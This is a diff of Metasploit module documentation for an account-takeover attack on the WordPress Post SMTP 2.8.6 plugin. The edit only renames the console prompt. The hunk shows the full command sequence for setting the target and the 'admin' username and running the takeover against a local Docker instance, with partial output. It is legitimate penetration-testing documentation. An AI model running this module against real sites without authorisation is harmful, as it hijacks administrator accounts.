@@ -77,18 +77,18 @@ The username to perform a password reset against
 ### Wordpress 6.6.2 with SMTP Post 2.8.6 on Docker
 
 ```
-msf6 > use auxiliary/admin/http/wp_post_smtp_acct_takeover
-msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set rhost 127.0.0.1
+msf > use auxiliary/admin/http/wp_post_smtp_acct_takeover
+msf auxiliary(admin/http/wp_post_smtp_acct_takeover) > set rhost 127.0.0.1
 rhost => 127.0.0.1
-msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set rport 5555
+msf auxiliary(admin/http/wp_post_smtp_acct_takeover) > set rport 5555
 rport => 5555
-msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set ssl false
+msf auxiliary(admin/http/wp_post_smtp_acct_takeover) > set ssl false
 ssl => false
-msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set username admin
+msf auxiliary(admin/http/wp_post_smtp_acct_takeover) > set username admin
 username => admin
-msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > set verbose true
+msf auxiliary(admin/http/wp_post_smtp_acct_takeover) > set verbose true
 verbose => true
-msf6 auxiliary(admin/http/wp_post_smtp_acct_takeover) > run
+msf auxiliary(admin/http/wp_post_smtp_acct_takeover) > run
 [*] Running module against 127.0.0.1
 
 [*] Running automatic check ("set AutoCheck false" to disable)
